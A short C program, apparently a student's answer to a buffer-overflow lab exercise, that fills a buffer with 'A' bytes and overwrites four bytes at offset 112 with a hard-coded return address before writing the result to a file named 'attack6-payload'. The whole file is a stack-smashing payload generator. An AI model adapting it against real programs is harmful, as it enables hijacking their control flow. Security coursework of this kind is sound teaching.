#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
	int buf_len=V6_SIZE+13;
	char buf[buf_len];
	memset(buf,'A',buf_len);
	buf[112]=0x04;
	buf[113]=0x86;
	buf[114]=0x04;
	buf[115]=0x08;
    write_to_file( "attack6-payload", buf , buf_len , FILE_CLEAR );
    exit(0);
}
